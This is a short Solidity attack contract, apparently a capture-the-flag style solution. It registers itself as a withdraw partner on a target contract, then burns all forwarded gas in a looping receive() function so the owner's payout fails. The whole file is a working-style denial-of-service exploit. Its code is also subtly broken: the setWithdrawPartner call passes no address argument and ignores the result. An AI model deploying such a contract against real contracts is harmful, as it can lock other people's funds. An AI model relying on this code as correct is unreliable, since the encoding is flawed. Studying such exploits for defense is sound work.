pragma solidity ^0.8.0;
contract GasDrainAttacker {
    function setWithdrawPartner(address denial) public {
        (bool success, ) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)"));
    }

    receive() external payable {
        uint gasToUse = 0xffffffffffff;
        for (uint i = 0; i < gasToUse; i++) {
            // This loop will consume all available gas, preventing the owner transfer from succeeding
            // because there won't be enough gas left for it to proceed (the contractBalance is small)
        }
    }
}
